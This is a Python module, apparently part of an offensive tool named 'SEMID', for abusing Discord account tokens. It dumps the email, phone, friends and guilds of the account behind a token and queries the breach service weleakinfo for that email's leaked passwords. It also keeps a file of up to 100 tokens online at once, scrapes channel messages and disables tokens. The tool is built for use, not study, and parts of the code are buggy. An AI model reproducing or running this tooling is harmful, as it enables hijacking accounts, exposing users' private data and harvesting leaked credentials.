from threading import Thread
from fake_headers import Headers
from semid.util.console import Console
import semid
from semid.util.token import TokenUtil
import requests, json, time, argparse
from concurrent.futures import ThreadPoolExecutor
from websocket import WebSocket

def tokeninfo(args:str):
    weleakinfo = semid.__app__.config["WeLeakInfo"]
    parser = argparse.ArgumentParser(prog="SEMID")
    parser.add_argument("--token", "-t", required=False)
    parser.add_argument("--weleak", "-w", required=False, action="store_true")
    argsArr = args.split()
    try:
        arg = parser.parse_args(argsArr)
    except:
        return TypeError
    token = arg.token
    TokenUtil.validateToken(token)
    headers = Headers(browser="chrome", os="windows", headers=True).generate()
    headers["Authorization"] = token
    headers["Accept-Encoding"] = "application/json"
    me = requests.get("https://discord.com/api/users/@me", headers=headers)
    me.raise_for_status()
    me = me.json()
    friends = requests.get("https://discord.com/api/users/@me/relationships", headers=headers)
    friends.raise_for_status()
    friends = friends.json()
    # connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers)
    # connections.raise_for_status()
    # connections = connections.json()
    # billing = requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)
    # billing.raise_for_status()
    # billing = billing.json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers)
    guilds.raise_for_status()
    guilds = guilds.json()
    c = Console.red("|")
    nitro = "None"
    print(me)
    text = f"""{c} User: {me["username"]}#{me["discriminator"]} | {me["id"]}
{c} Login: {me["email"]}
{c} Phone: {me["phone"]}
{c} Nitro: {nitro}
{c} Friends: {str(len(friends))} , Rare Badge Friends: {str(len(TokenUtil.calcfriends(friends)))}
{c} Guilds: {str(len(guilds))}
{c} Connections: Working on it!"""#.join(f"""  {c} {co["type"]}
       # {c} Name: {co["name"]}
       # {c} ID: {co["id"]}""" for co in connections)
    print(text)
    if weleakinfo != "" and arg.weleak == True:
        print(c + "Trying to get info from weleakinfo...")
        try:
            res = requests.get(f"https://api.weleakinfo.to/api?value={me['email']}&type=email&key={weleakinfo}").json()
            if res["success"] == True:
                for l in res["result"]:
                    if l["email_only"] == 1:
                        print(f"Found email: {l['line']}")
                    else:
                        print(f"Found password: {l['line']}")
            else:
                print("Nothing found.")
        except:
            print("Nothing found.")

def tokeninfosyntax():
    text = """
--token  | -t   <token>
--weleak | -w   Searches found email on weleakinfo

Example: use discord::tokeninfo --token <token> -w"""
    return text
def tokenonliner(args:str):
    weleakinfo = semid.__app__.config["WeLeakInfo"]
    parser = argparse.ArgumentParser(prog="SEMID")
    parser.add_argument("--file", "-f", required=False)
    parser.add_argument("--max", "-m", required=False, default=100)
    argsArr = args.split()
    try:
        arg = parser.parse_args(argsArr)
    except:
        raise TypeError
    file = arg.file
    max = arg.max
    ex = ThreadPoolExecutor(max_workers=int(max))

    def online(token):
        print(token)
        ws = WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
        hb = json.loads(ws.recv())
        interval = hb["d"]["heartbeat_interval"]
        useragent = Headers(browser="chrome", os="windows", headers=True).generate()["User-Agent"]
        ws.send(json.dumps({"op": 2,"d": {"presence": {"activities": [], 'afk': False, "since": 0, "status": "online"},"token": token,"properties": {"$os": "Windows_NT","$browser": useragent,"$device": "desktop"}}}))
        while True:
            time.sleep(interval/1000)
            try:
                ws.send(json.dumps({"op": 1,"d": None}))
            except Exception:
                break
    tokens = open(file).read().splitlines()
    i = 1
    for token in tokens:
        ex.submit(online, token)
        print(f'Connected {i} tokens')
        i += 1
def tokenonlinersyntax():
    text = """
--file | -f <filepath>      The Filepath of your tokens
--max  | -m <max-threads>   The amount of tokens

Example: use discord::tokenonliner -f tokens.txt -m 100"""
    return text
def scrapechannel(args:str):
    parser = argparse.ArgumentParser("SEMID")
    parser.add_argument("--channelid", "-c", required=False)
    parser.add_argument("--limit", "-l", required=False)
    parser.add_argument("--file", "-f", required=False, default="messages.txt")
    parser.add_argument("--token", "-t", required=False)
    parser.add_argument("--thread", "-T", required=False, action="store_true", default=False)
    args = args.split()
    args = parser.parse_args(args)
    print(args)
    try:
        id = args.channelid
        limit = int(args.limit)
    except: 
        raise TypeError
    if limit > 50:
        limit = 50
    try:
        token = args.token
    except:
        token = semid.__app__.config["Token"]
    if token == "" or token is None:
        return print("Please update your token in config.json!")
    TokenUtil.validateToken(token)
    if limit < 0:
        file = args.file
        messages = []
        def write_messages(messages):
            print(Console.green("Done fetching messages"))
            with open(file, "w", encoding="utf-8") as f:
                for message in messages:
                    f.write(message)

        def fetch(channel, token, before):
            url = f"https://discord.com/api/channels/{channel}/messages?limit=50"
            if before != 0:
                url += f"&before={before}"
            res = requests.get(url, headers={"authorization": token})
            msgs = json.loads(res.text)
            if len(msgs) != 50:
                for message in msgs:
                    content = ''
                    if message["content"] == content and len(message["attachments"]) > 0:
                        content = message["attachments"][0]["url"]
                    messages.append('|| ' + message["author"]["username"] + '#' + message["author"]["discriminator"] + ' | ' + message["content"].replace("\n", " ") + content + '\n')
                write_messages(messages)
            else:
                for message in msgs:
                    content = ""
                    if message["content"] == content and len(message["attachments"]) > 0:
                        content = message["attachments"][0]["url"]
                    messages.append('|| '+ message["author"]["username"] + '#' + message["author"]["discriminator"] + ' | ' + message["content"].replace("\n", " ") + content + '\n')
                fetch(channel, token, msgs[49]["id"])
        if args.thread == True:
            Thread(target=fetch, args=(id, token, 0)).start()
        else:
            fetch(id, token, 0)

    else:
        res = requests.get(f"https://discord.com/api/channels/{id}/messages?limit={limit}", headers=token)
        if res.status == 200:
            messages = json.loads(res.text)
            for message in messages:
                attachmenturl = ""
                if len(message["attachments"]) > 0:
                    attachmenturl = message["attachments"][0]["url"]                   
                print(message["author"]["username"] + '#' + message["author"]["discriminator"] + ': ' + message["content"].replace("\n", " ") + attachmenturl)
            else:
                return print(Console.red("Invalid Token!"))

    
def scrapechannelsyntax():
    text = """
--channelid | -c <channelid>
--token     | -t <token> (if not included, will use token in config.json)
--file      | -f <filepath> for output (not required)
--limit     | -l <limit> (1-50) or -1 for all messages
--thread    | -T run the function in another thread (so you can still do other things in the meantime)


Example: discord::scrapechannel -c 934255362537275 -l -1 --thread"""
    return text


def disabletoken(args:str):
    parser = argparse.ArgumentParser("SEMID")
    parser.add_argument("--token", "-t", required=False)
    args = args.split()
    args = parser.parse_args(args)
    try:
        token = args.token
    except:
        raise TypeError
    a = input("Are you sure you want to disable this token? [y/n]: ")
    if a.lower() == "y" or a.lower() == "yes":
        TokenUtil.disableToken(token)
    else: 
        return
def disabletokensyntax():
    text = """
--token | -t <token>

Example: use discord::disabletoken NDIzNTQ0OTQ3Njg2MjQ0MzYy.Yegw_g.MpI6o6LXqKS1qqeqcKvfJUo7Gqd"""
    return text